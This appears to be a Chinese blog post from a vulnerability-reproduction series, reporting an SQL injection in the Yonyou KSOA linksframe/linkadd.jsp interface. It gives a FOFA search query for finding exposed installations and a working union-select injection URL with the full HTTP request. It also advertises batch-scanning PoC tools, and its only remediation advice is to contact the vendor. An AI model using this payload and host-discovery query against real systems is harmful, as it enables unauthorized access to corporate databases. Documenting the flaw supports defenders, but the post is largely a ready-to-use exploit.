#  用友时空KSOA linksframe/linkadd.jsp接口存在SQL注入漏洞   
南风徐来  南风漏洞复现文库   2024-05-06 22:56  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 用友时空KSOA简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
用友时空KSOA是一款专业的企业应用集成平台，可整合企业各种信息系统和业务系统，帮助企业快速了解业务状态和动态。 通过用友时空KSOA，企业可以通过自定义关键业务指标，实时监控各系统和业务状态，并通过分析工具优化业务管理和决策支持模式。 功能： 包括应用整合、业务集成、数据共享、流程自动化等。 价值： 用友时空KSOA可以帮助企业提升业务管理效率，快速响应客户需求，防范风险，提高决策质量和企业竞争力。  
## 2.漏洞描述  
  
用友时空KSOA是一款专业的企业应用集成平台，可整合企业各种信息系统和业务系统，帮助企业快速了解业务状态和动态。 通过用友时空KSOA，企业可以通过自定义关键业务指标，实时监控各系统和业务状态，并通过分析工具优化业务管理和决策支持模式。 功能： 包括应用整合、业务集成、数据共享、流程自动化等。 价值： 用友时空KSOA可以帮助企业提升业务管理效率，快速响应客户需求，防范风险，提高决策质量和企业竞争力。用友时空KSOA linksframe/linkadd.jsp接口存在SQL注入漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
用友时空KSOA  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YVuPeMiaoe2TBMZwMspNUDlAc5O83cPrJ5hQhZ7pkYhAH5LTvrF341FxlDqfic3wgyXmo0ubePzPaQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
用友时空KSOA linksframe/linkadd.jsp接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
app="用友-时空KSOA"  
## 5.漏洞复现  
  
漏洞链接：http://xxx.xxx.xxx.xxx/linksframe/linkadd.jsp?id=666666%27+union+all+select+null%2Cnull%2Csys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%271%27%29%29%2Cnull%2Cnull%2C%27  
  
漏洞数据包：  
```
GET /linksframe/linkadd.jsp?id=666666%27+union+all+select+null%2Cnull%2Csys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%271%27%29%29%2Cnull%2Cnull%2C%27 HTTP/1.1
Host: xx.xxx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YVuPeMiaoe2TBMZwMspNUDlyxvHE8foIk1Kk4ZTiahrNsOZnoGzocXkPJUdRp7psqTOWHCsBiaLiazLw/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现130 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YVuPeMiaoe2TBMZwMspNUDlyrLvpEc8ksHRDYgdVOEBOAaP7vRL43ic5Fwf3xmcjxxajzJVALXFlibw/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YVuPeMiaoe2TBMZwMspNUDlwHmiaJpzdTaybWDQvZiaBdM5AeAZvhZs1o8ngq6W7k9kHNCSwGyjricUQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YVuPeMiaoe2TBMZwMspNUDl69fzkiaOGD3Vibc3CnDIcXVIbcaTC1dpPX7icPFJNBFibiatTbaAwicDg3jA/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YVuPeMiaoe2TBMZwMspNUDlqib6QC8F3ZecJEjnVAdXfU0qScicHyXcW3xMiaTDF2GLRXzyvFaW9IReg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YVuPeMiaoe2TBMZwMspNUDlYJYtWBzibmrnyrj8zIX5iamiaicibZroibal7XdJKzNY3iadsacPFibp64F30A/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YVuPeMiaoe2TBMZwMspNUDlWNUukv525HUEl2VlibFicqbaptr9jlQ3GkFNItnHlzsKlib6cswTFRppQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YVuPeMiaoe2TBMZwMspNUDle7z227KlYesibGXDdogkic4aVhmeLLOXIa4YXPznBPHJrPVFYx5zewPA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请联系厂商更新补丁  
## 8.往期回顾  
  
  
[用友crm客户关系管理pub/downloadfile.php接口存在任意文件读取漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486384&idx=1&sn=6cded6c301c425146633b7c8e92b9ae2&chksm=974b86b7a03c0fa1f00ab48f05f1a7521aafbcf878188a0eee618c2e26d9614d282cd1ff7a58&scene=21#wechat_redirect)  
  
  
[用友政务财务系统FileDownload接口存在任意文件读取漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486371&idx=1&sn=8ea4470a40d2100d18aecb3a4abcff6c&chksm=974b86a4a03c0fb2dad3b970bae511a25e02796d939379b41cee9a8372a421337989e1d432ef&scene=21#wechat_redirect)  
  
  
